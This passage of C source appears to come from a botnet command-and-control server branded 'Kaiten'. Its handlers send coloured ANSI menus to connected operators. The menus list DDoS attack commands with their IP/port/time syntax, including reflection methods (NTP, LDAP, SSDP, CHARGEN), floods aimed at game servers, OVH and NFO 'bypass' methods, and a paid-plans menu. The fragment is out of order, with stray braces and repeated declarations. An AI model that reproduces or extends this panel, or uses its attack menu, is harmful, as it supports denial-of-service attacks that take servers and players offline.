                sprintf(p11,  "\e[38;2;255;0;211m╔══════════\e[38;2;227;27;216m════════\e[38;2;199;53;221m═══════\e[38;2;171;80;226m══════\e[38;2;143;106;231m╗                                      \r\n");
                sprintf(p12,  "\e[38;2;255;0;211m║    Kaiten \e[38;2;227;27;216mDDoS Pro\e[38;2;199;53;221mtection\e[38;2;171;80;226m     ╠\e[38;2;116;133;235m══>\e[38;2;116;133;235m Status : \e[1;32mRunning.                  \r\n");
                sprintf(p13,  "\e[38;2;255;0;211m╚════════════\e[38;2;227;27;216m════════\e[38;2;199;53;221m═══════\e[38;2;171;80;226m════╝                                      \r\n");

        if(send(datafd, p2,  strlen(p2), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p3,  strlen(p3), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p4,  strlen(p4), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p5,  strlen(p5), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p6,  strlen(p6), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p7,  strlen(p7), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p8,  strlen(p8), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p9,  strlen(p9), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p10,  strlen(p10), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p11,  strlen(p11), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p12,  strlen(p12), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p13,  strlen(p13), MSG_NOSIGNAL) == -1) goto end;
    }

            if(strstr(buf, "IPHM") || strstr(buf, "iphm") || strstr(buf, "Iphm") || strstr(buf, "IpHm") || strstr(buf, "IphM") || strstr(buf, "IPHm")) 
            {
                send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);
                if(send(datafd, banner0,  strlen(banner0),	MSG_NOSIGNAL) == -1) goto end;			
	  			if(send(datafd, banner1,  strlen(banner1),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner2,  strlen(banner2),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner3,  strlen(banner3),	MSG_NOSIGNAL) == -1) goto end; 
	  			if(send(datafd, banner4,  strlen(banner4),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner5,  strlen(banner5),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner6,  strlen(banner6),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner7,  strlen(banner7),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner8,  strlen(banner8),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner9,  strlen(banner9),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner10,  strlen(banner10),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner11,  strlen(banner11),	MSG_NOSIGNAL) == -1) goto end;

        char pline  [800];
        char p2  [800];
        char p3  [800];
        char p4  [800];
        char p6  [800];
        char p7  [800];
        char p8  [800];
        char p9  [800];
        char p10  [800];        //    \e[38;2;171;80;226m
        char p11  [800];        //    \e[38;2;143;106;231m
        char p12  [800];        //    \e[38;2;116;133;235m
        char p13  [800];
        char p14  [800];
        char p15  [800];
                //    \e[38;2;255;0;211m

        //    \e[38;2;227;27;216m

        //    \e[38;2;199;53;221m

        //    \e[38;2;171;80;226m

        //    \e[38;2;143;106;231m

        //    \e[38;2;116;133;235m

        //    \e[38;2;88;159;240m
                sprintf(pline,"\e[1;35m          ╔══════════════════════\e[1;36m══════════════════════╗\r\n");
                sprintf(p2,   "\e[1;35m          ║ Hello there, Welcome \e[1;36mTo Kaiten Amp Methods ║\r\n");
                sprintf(p3,   "\e[1;35m          ╚══════════════════════\e[1;36m══════════════════════╝       \r\n");
                sprintf(p4,   "\e[1;35m╔════════════════════════════════\e[1;36m╦════════════════════════════════╗   \r\n");
                sprintf(p6,   "\e[1;35m║.LDAP [IP] [PORT] [TIME]        \e[1;36m║.NTP [IP] [PORT] [TIME]         ║\r\n");
                sprintf(p7,   "\e[1;35m║.TFTP [IP] [PORT] [TIME]        \e[1;36m║.WSD [IP] [PORT] [TIME]         ║ \r\n");
                sprintf(p8,   "\e[1;35m║.SSDP [IP] [PORT] [TIME]        \e[1;36m║.IPSEC [IP] [PORT] [TIME]       ║  \r\n");
                sprintf(p9,   "\e[1;35m║.SNMP [IP] [PORT] [TIME]        \e[1;36m║.O-VPN [IP] [PORT] [TIME]       ║   \r\n");
                sprintf(p10,  "\e[1;35m║.CHARGEN [IP] [PORT] [TIME]     \e[1;36m║.DVR [IP] [PORT] [TIME]         ║    \r\n");
                sprintf(p11,  "\e[1;35m║.NETBIOS [IP] [PORT] [TIME]     \e[1;36m║.OVH-KTN [IP] [PORT] [TIME]     ║\r\n");
                sprintf(p12,  "\e[1;35m║.MSSQL [IP] [PORT] [TIME]       \e[1;36m║.HIPER-OVH [IP] [PORT]          ║\r\n");
                sprintf(p13,  "\e[1;35m║.SENTINEL [IP] [PORT] [TIME]    \e[1;36m║.VOX-BYPASS [IP] [TIME]         ║\r\n");
                sprintf(p14,  "\e[1;35m║.T-MOBILE [IP] [PORT] [TIME]    \e[1;36m║.ATT [IP] [PORT] [TIME]         ║\r\n");
                sprintf(p15,  "\e[1;35m╚════════════════════════════════\e[1;36m╩════════════════════════════════╝\r\n");

        if(send(datafd, pline,  strlen(pline), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p2,  strlen(p2), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p3,  strlen(p3), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p4,  strlen(p4), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p6,  strlen(p6), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p7,  strlen(p7), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p8,  strlen(p8), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p9,  strlen(p9), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p10,  strlen(p10), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p11,  strlen(p11), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p12,  strlen(p12), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p13,  strlen(p13), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p14,  strlen(p14), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p15,  strlen(p15), MSG_NOSIGNAL) == -1) goto end;
    }

          if(strstr(buf, "GAME") || strstr(buf, "game") || strstr(buf, "Game") || strstr(buf, "GaMe") || strstr(buf, "gamE") || strstr(buf, "GamE")) 
          {
                        send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);
                        if(send(datafd, banner0,  strlen(banner0),	MSG_NOSIGNAL) == -1) goto end;			
	  			if(send(datafd, banner1,  strlen(banner1),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner2,  strlen(banner2),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner3,  strlen(banner3),	MSG_NOSIGNAL) == -1) goto end; 
	  			if(send(datafd, banner4,  strlen(banner4),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner5,  strlen(banner5),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner6,  strlen(banner6),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner7,  strlen(banner7),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner8,  strlen(banner8),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner9,  strlen(banner9),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner10,  strlen(banner10),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner11,  strlen(banner11),	MSG_NOSIGNAL) == -1) goto end;

        char p2  [800];
        char p3  [800];
        char p4  [800];
        char p5  [800];
        char p6  [800];
        char p7  [800];
        char p8  [800];
        char p9  [800];
        char p10  [800];        //    \e[38;2;171;80;226m
        char p11  [800];        //    \e[38;2;143;106;231m
        char p12  [800];
        char p13  [800];        //    \e[38;2;116;133;235m

                sprintf(p2,   "\e[38;2;255;0;211m ╔═════\e[38;2;227;27;216m══════\e[38;2;199;53;221m══════\e[38;2;171;80;226m══════\e[38;2;143;106;231m╗                           \r\n");
                sprintf(p3,   "\e[38;2;255;0;211m ║ Game \e[38;2;227;27;216mServer\e[38;2;199;53;221m DDoS \e[38;2;171;80;226mHub  \e[38;2;143;106;231m║                            \r\n");
                sprintf(p4,   "\e[38;2;255;0;211m ╠═══════\e[38;2;227;27;216m══════\e[38;2;199;53;221m══════\e[38;2;171;80;226m════\e[38;2;143;106;231m╣                             \r\n");
                sprintf(p5,   "\e[38;2;255;0;211m ║DO NOT S\e[38;2;227;27;216mPAM AT\e[38;2;199;53;221mTACKS!\e[38;2;171;80;226m!  \e[38;2;143;106;231m╚═════════════╗                \r\n");
                sprintf(p6,   "\e[38;2;255;0;211m ║!* FN [IP\e[38;2;227;27;216m] [POR\e[38;2;199;53;221mT] [TI\e[38;2;171;80;226mME]\e[38;2;143;106;231m 32 1024 10  ║                 \r\n");
                sprintf(p7,   "\e[38;2;255;0;211m ║!* ARK [IP\e[38;2;227;27;216m] [POR\e[38;2;199;53;221mT] [TI\e[38;2;171;80;226mME]\e[38;2;143;106;231m 32 1024 10 ║                  \r\n");
                sprintf(p8,   "\e[38;2;255;0;211m ║!* COD [IP]\e[38;2;227;27;216m [PORT\e[38;2;199;53;221m] [TIM\e[38;2;171;80;226mE] \e[38;2;143;106;231m32 1024 10 ║                   \r\n");
                sprintf(p9,   "\e[38;2;255;0;211m ║!* GTA [IP] \e[38;2;227;27;216m[PORT]\e[38;2;199;53;221m [TIME\e[38;2;171;80;226m] 3\e[38;2;143;106;231m2 1024 10 ║                    \r\n");
                sprintf(p10,  "\e[38;2;255;0;211m ║!* RBX [IP] [\e[38;2;227;27;216mPORT] \e[38;2;199;53;221m[TIME]\e[38;2;171;80;226m 32\e[38;2;143;106;231m 1024 10 ║                     \r\n");
                sprintf(p11,  "\e[38;2;255;0;211m ║!* MC [IP] [PO\e[38;2;227;27;216mRT] [T\e[38;2;199;53;221mIME]  \e[38;2;171;80;226m32 \e[38;2;143;106;231m1024 10 ║                      \r\n");
                sprintf(p12,  "\e[38;2;255;0;211m ║!* R6 [IP] [POR\e[38;2;227;27;216mT] [TI\e[38;2;199;53;221mME] 32\e[38;2;171;80;226m 10\e[38;2;143;106;231m24 10  ║                      \r\n");
                sprintf(p13,  "\e[38;2;255;0;211m ╚════════════════\e[38;2;227;27;216m══════\e[38;2;199;53;221m══════\e[38;2;171;80;226m═══\e[38;2;143;106;231m══════╝                       \r\n");

      
        if(send(datafd, p2,  strlen(p2), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p3,  strlen(p3), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p4,  strlen(p4), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p5,  strlen(p5), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p6,  strlen(p6), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p7,  strlen(p7), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p8,  strlen(p8), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p9,  strlen(p9), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p10,  strlen(p10), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p11,  strlen(p11), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p12,  strlen(p12), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p13,  strlen(p13), MSG_NOSIGNAL) == -1) goto end;
    }

             if(strstr(buf, "API") || strstr(buf, "api") || strstr(buf, "ApI") || strstr(buf, "aypi")) 
          {
                send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);
                if(send(datafd, banner0,  strlen(banner0),	MSG_NOSIGNAL) == -1) goto end;			
	  			if(send(datafd, banner1,  strlen(banner1),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner2,  strlen(banner2),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner3,  strlen(banner3),	MSG_NOSIGNAL) == -1) goto end; 
	  			if(send(datafd, banner4,  strlen(banner4),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner5,  strlen(banner5),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner6,  strlen(banner6),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner7,  strlen(banner7),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner8,  strlen(banner8),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner9,  strlen(banner9),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner10,  strlen(banner10),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner11,  strlen(banner11),	MSG_NOSIGNAL) == -1) goto end;

        char p2  [800];
        char p3  [800];
        char p4  [800];
        char p5  [800];
        char p6  [800];
        char p7  [800];
        char p8  [800];
        char p9  [800];
        char p10  [800];        //    \e[38;2;171;80;226m

                        //    \e[38;2;255;0;211m

        //    \e[38;2;227;27;216m

        //    \e[38;2;199;53;221m

        //    \e[38;2;171;80;226m

        //    \e[38;2;143;106;231m

        //    \e[38;2;116;133;235m

        //    \e[38;2;88;159;240m

      sprintf(p2,   "\e[38;2;255;0;211m╔════\e[38;2;227;27;216m═════\e[38;2;199;53;221m══╦══\e[38;2;171;80;226m═════\e[38;2;143;106;231m═════\e[38;2;116;133;235m═╗           \r\n");
      sprintf(p3,   "\e[38;2;255;0;211m║ OVH\e[38;2;227;27;216m-OMG \e[38;2;199;53;221m  ║AM\e[38;2;171;80;226mP-MUL\e[38;2;143;106;231mTI   \e[38;2;116;133;235m ║      \r\n");
      sprintf(p4,   "\e[38;2;255;0;211m║ OVH\e[38;2;227;27;216m-UDP \e[38;2;199;53;221m  ║PO\e[38;2;171;80;226mRTKIL\e[38;2;143;106;231mL-AMP\e[38;2;116;133;235m ║           \r\n");
      sprintf(p5,   "\e[38;2;255;0;211m║ OVH\e[38;2;227;27;216m-STOR\e[38;2;199;53;221mM ║FO\e[38;2;171;80;226mRTNIT\e[38;2;143;106;231mE    \e[38;2;116;133;235m ║          \r\n");
      sprintf(p6,   "\e[38;2;255;0;211m║ OVH\e[38;2;227;27;216m     \e[38;2;199;53;221m  ║RO\e[38;2;171;80;226mBLOXN\e[38;2;143;106;231mODE  \e[38;2;116;133;235m ║ \e[38;2;88;159;240m- Prefix: nuke      \r\n");
      sprintf(p7,   "\e[38;2;255;0;211m║ AUT\e[38;2;227;27;216mOBYPA\e[38;2;199;53;221mSS║GA\e[38;2;171;80;226mME-ST\e[38;2;143;106;231mORM  \e[38;2;116;133;235m ║               \r\n");
      sprintf(p8,   "\e[38;2;255;0;211m║ AUT\e[38;2;227;27;216mOv3  \e[38;2;199;53;221m  ║TC\e[38;2;171;80;226mP-NOD\e[38;2;143;106;231mE    \e[38;2;116;133;235m ║          \r\n");
      sprintf(p9,   "\e[38;2;255;0;211m║ NFO\e[38;2;227;27;216m-MIX \e[38;2;199;53;221m  ║HT\e[38;2;171;80;226mTPS-P\e[38;2;143;106;231mREMIU\e[38;2;116;133;235mM║                \r\n");
      sprintf(p10,  "\e[38;2;255;0;211m╚════\e[38;2;227;27;216m═════\e[38;2;199;53;221m══╩══\e[38;2;171;80;226m═════\e[38;2;143;106;231m═════\e[38;2;116;133;235m═╝                    \r\n");

      
        if(send(datafd, p2,  strlen(p2), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p3,  strlen(p3), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p4,  strlen(p4), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p5,  strlen(p5), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p6,  strlen(p6), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p7,  strlen(p7), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p8,  strlen(p8), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p9,  strlen(p9), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p10,  strlen(p10), MSG_NOSIGNAL) == -1) goto end;
    }


            if(strstr(buf, "STANDARD") || strstr(buf, "standard") || strstr(buf, "Standard")) 
            {
                send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);
                if(send(datafd, banner0,  strlen(banner0),	MSG_NOSIGNAL) == -1) goto end;			
	  			if(send(datafd, banner1,  strlen(banner1),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner2,  strlen(banner2),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner3,  strlen(banner3),	MSG_NOSIGNAL) == -1) goto end; 
	  			if(send(datafd, banner4,  strlen(banner4),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner5,  strlen(banner5),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner6,  strlen(banner6),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner7,  strlen(banner7),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner8,  strlen(banner8),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner9,  strlen(banner9),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner10,  strlen(banner10),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner11,  strlen(banner11),	MSG_NOSIGNAL) == -1) goto end;

        char ls1  [800];
        char ls2  [800]; 
        char ls3  [800];                       
        char ls4  [800];
        char ls5  [800];
        char ls6  [800];
        char ls7  [800]; 
        char ls8  [800];
        char ls9  [800];


            
                     // \e[1;37m
                //    \e[38;2;255;0;211m

        //    \e[38;2;227;27;216m

        //    \e[38;2;199;53;221m

        //    \e[38;2;171;80;226m

        //    \e[38;2;143;106;231m

        //    \e[38;2;116;133;235m

        //    \e[38;2;88;159;240m


                sprintf(ls1,   "\e[38;2;255;0;211m╔╗   \e[1;37mWelcome To Standard DDoS Methods   \e[38;2;88;159;240m╔╗\r\n");
                sprintf(ls2,   "\e[38;2;255;0;211m ╠═══\e[38;2;227;27;216m════\e[38;2;199;53;221m════\e[38;2;171;80;226m════\e[38;2;143;106;231m════\e[38;2;116;133;235m════\e[38;2;88;159;240m═══════════════╣\r\n");
                sprintf(ls3,   "\e[38;2;255;0;211m ║!* S\e[38;2;227;27;216mTDHE\e[38;2;199;53;221mX [I\e[38;2;171;80;226mP] [\e[38;2;143;106;231mPORT\e[38;2;116;133;235m] [T\e[38;2;88;159;240mIME]          ║ \r\n");
                sprintf(ls4,   "\e[38;2;255;0;211m ║!* UD\e[38;2;227;27;216mP [I\e[38;2;199;53;221mP] [\e[38;2;171;80;226mPORT\e[38;2;143;106;231m] [T\e[38;2;116;133;235mIME]\e[38;2;88;159;240m 32 0 1      ║\r\n");
                sprintf(ls5,   "\e[38;2;255;0;211m ║!* TCP\e[38;2;227;27;216m [IP\e[38;2;199;53;221m] [P\e[38;2;171;80;226mORT]\e[38;2;143;106;231m [TI\e[38;2;116;133;235mME] \e[38;2;88;159;240m32 flag 0 10║\r\n");
                sprintf(ls6,   "\e[38;2;255;0;211m ║!* VSE \e[38;2;227;27;216m[IP]\e[38;2;199;53;221m [PO\e[38;2;171;80;226mRT] \e[38;2;143;106;231m[TIM\e[38;2;116;133;235mE] 3\e[38;2;88;159;240m2 1240 10  ║\r\n");
                sprintf(ls7,   "\e[38;2;255;0;211m ╠════════\e[38;2;227;27;216m════\e[38;2;199;53;221m════\e[38;2;171;80;226m════\e[38;2;143;106;231m════\e[38;2;116;133;235m════\e[38;2;88;159;240m══════════╣\r\n");
                sprintf(ls8,   "\e[38;2;255;0;211m ║TCP Flags\e[38;2;227;27;216m: sy\e[38;2;199;53;221mn/ac\e[38;2;171;80;226mk/rs\e[38;2;143;106;231mt/fi\e[38;2;116;133;235mn/ps\e[38;2;88;159;240mh        ║\r\n");
                sprintf(ls9,   "\e[38;2;255;0;211m ╚══════════\e[38;2;227;27;216m════\e[38;2;199;53;221m════\e[38;2;171;80;226m════\e[38;2;143;106;231m════\e[38;2;116;133;235m════\e[38;2;88;159;240m════════╝\r\n");
    

                if(send(datafd, ls1,  strlen(ls1),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls2,  strlen(ls2),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls3,  strlen(ls3),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls4,  strlen(ls4),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls5,  strlen(ls5),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls6,  strlen(ls6),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls7,  strlen(ls7),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls8,  strlen(ls8),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls9,  strlen(ls9),  MSG_NOSIGNAL) == -1) goto end;
    }



    if(strstr(buf, "special") || strstr(buf, "SPECIAL") || strstr(buf, "Special")) {
        	  			send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);
	  			if(send(datafd, banner0,  strlen(banner0),	MSG_NOSIGNAL) == -1) goto end;				
	  			if(send(datafd, banner1,  strlen(banner1),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner2,  strlen(banner2),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner3,  strlen(banner3),	MSG_NOSIGNAL) == -1) goto end; 
	  			if(send(datafd, banner4,  strlen(banner4),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner5,  strlen(banner5),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner6,  strlen(banner6),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner7,  strlen(banner7),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner8,  strlen(banner8),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner9,  strlen(banner9),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner10,  strlen(banner10),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner11,  strlen(banner11),	MSG_NOSIGNAL) == -1) goto end;

        char ls1  [800];
        char ls2  [800];
        char ls3  [800];
        char ls4  [800];
        char ls5  [800];
        char ls6  [800];
        char ls7  [800];
        char ls8  [800];
        char ls9  [800];
        char ls10  [800];
        char ls11  [800];
        char ls12 [800];
        char ls13 [800];
        char ls14 [800];


        //    \e[38;2;255;0;211m

        //    \e[38;2;227;27;216m

        //    \e[38;2;199;53;221m

        //    \e[38;2;171;80;226m

        //    \e[38;2;143;106;231m

        //    \e[38;2;116;133;235m

        //    \e[38;2;88;159;240m

                 
                sprintf(ls1,   "\e[38;2;255;0;211m    ╔═══\e[38;2;227;27;216m════\e[38;2;199;53;221m════\e[38;2;171;80;226m════\e[38;2;143;106;231m════\e[38;2;116;133;235m════\e[38;2;88;159;240m═════════════╦════════╗\r\n");
                sprintf(ls2,   "\e[38;2;255;0;211m    ║!* S\e[38;2;227;27;216mLAP-\e[38;2;199;53;221mOVH \e[38;2;171;80;226m[IP]\e[38;2;143;106;231m [PO\e[38;2;116;133;235mRT] \e[38;2;88;159;240m[TIME] 1024 ║\e[1;37mOVH/s...\e[38;2;88;159;240m║\r\n");
                sprintf(ls3,   "\e[38;2;255;0;211m    ║!* NF\e[38;2;227;27;216mO-FU\e[38;2;199;53;221mCK [\e[38;2;171;80;226mIP] \e[38;2;143;106;231m[POR\e[38;2;116;133;235mT] [\e[38;2;88;159;240mTIME] 1640 ║\e[1;37mNFO/s...\e[38;2;88;159;240m║\r\n");
                sprintf(ls4,   "\e[38;2;255;0;211m    ║!* DOM\e[38;2;227;27;216mINAT\e[38;2;199;53;221mE [I\e[38;2;171;80;226mP] [\e[38;2;143;106;231mPORT\e[38;2;116;133;235m] [T\e[38;2;88;159;240mIME] 10   ║\e[1;37mServer/s\e[38;2;88;159;240m║\r\n");
                sprintf(ls5,   "\e[38;2;255;0;211m    ║!* LIZA\e[38;2;227;27;216mRDS \e[38;2;199;53;221m[IP]\e[38;2;171;80;226m [PO\e[38;2;143;106;231mRT] \e[38;2;116;133;235m[TIM\e[38;2;88;159;240mE]       ║\e[1;37mHome/s..\e[38;2;88;159;240m║\r\n");
                sprintf(ls6,   "\e[38;2;255;0;211m    ║!* KILLA\e[38;2;227;27;216mLLV2\e[38;2;199;53;221m [IP\e[38;2;171;80;226m] [P\e[38;2;143;106;231mORT]\e[38;2;116;133;235m [TI\e[38;2;88;159;240mME] 1024║\e[1;37mServer/s\e[38;2;88;159;240m║\r\n");
                sprintf(ls7,   "\e[38;2;255;0;211m    ║!* HYDRA-\e[38;2;227;27;216mB [I\e[38;2;199;53;221mP] [\e[38;2;171;80;226mPORT\e[38;2;143;106;231m] [T\e[38;2;116;133;235mIME]\e[38;2;88;159;240m 9999  ║\e[1;37mHydra/s.\e[38;2;88;159;240m║\r\n");
                sprintf(ls8,   "\e[38;2;255;0;211m    ║!* VPN-NUL\e[38;2;227;27;216mL [I\e[38;2;199;53;221mP] [\e[38;2;171;80;226mPORT\e[38;2;143;106;231m] [T\e[38;2;116;133;235mIME]\e[38;2;88;159;240m 1460 ║\e[1;37mVPN/s...\e[38;2;88;159;240m║\r\n");
                sprintf(ls9,   "\e[38;2;255;0;211m    ║!* OVH-UDP \e[38;2;227;27;216m[IP]\e[38;2;199;53;221m [PO\e[38;2;171;80;226mRT] \e[38;2;143;106;231m[TIM\e[38;2;116;133;235mE] 1\e[38;2;88;159;240m447  ║\e[1;37mOVH/s...\e[38;2;88;159;240m║\r\n");
                sprintf(ls10,  "\e[38;2;255;0;211m    ║!* KILL-OVH \e[38;2;227;27;216m[IP]\e[38;2;199;53;221m [PO\e[38;2;171;80;226mRT] \e[38;2;143;106;231m[TIM\e[38;2;116;133;235mE] 1\e[38;2;88;159;240m337 ║\e[1;37mOVH/s...\e[38;2;88;159;240m║\r\n");
                sprintf(ls11,  "\e[38;2;255;0;211m    ╚═════════════\e[38;2;227;27;216m════\e[38;2;199;53;221m════\e[38;2;171;80;226m════\e[38;2;143;106;231m════\e[38;2;116;133;235m════\e[38;2;88;159;240m═══╩════════╝\r\n");
                sprintf(ls12,  "\e[38;2;255;0;211m      \e[1;35m╔══════════════════     \e[1;36m══════════════════╗\r\n");
                sprintf(ls13,  "\e[38;2;255;0;211m       \e[1;37mWelcome To The Special Methods, %s          \r\n", managements[datafd].id);
                sprintf(ls14,  "\e[38;2;255;0;211m      \e[1;36m╚══════════════════     \e[1;35m══════════════════╝\r\n");
    

                if(send(datafd, ls1,  strlen(ls1),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls2,  strlen(ls2),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls3,  strlen(ls3),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls4,  strlen(ls4),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls5,  strlen(ls5),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls6,  strlen(ls6),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls7,  strlen(ls7),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls8,  strlen(ls8),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls9,  strlen(ls9),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls10,  strlen(ls10),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls11,  strlen(ls11),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls12,  strlen(ls12),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls13,  strlen(ls13),  MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, ls14,  strlen(ls14),  MSG_NOSIGNAL) == -1) goto end;
            }

            if(strstr(buf, "plans") || strstr(buf, "PLANS") || strstr(buf, "Plans") || strstr(buf, "Ploonies") || strstr(buf, "pleeeeeens") || strstr(buf, "PlAnZ")) {
                send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);
	  			if(send(datafd, banner0,  strlen(banner0),	MSG_NOSIGNAL) == -1) goto end;				
	  			if(send(datafd, banner1,  strlen(banner1),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner2,  strlen(banner2),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner3,  strlen(banner3),	MSG_NOSIGNAL) == -1) goto end; 
	  			if(send(datafd, banner4,  strlen(banner4),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner5,  strlen(banner5),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner6,  strlen(banner6),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner7,  strlen(banner7),	MSG_NOSIGNAL) == -1) goto end;
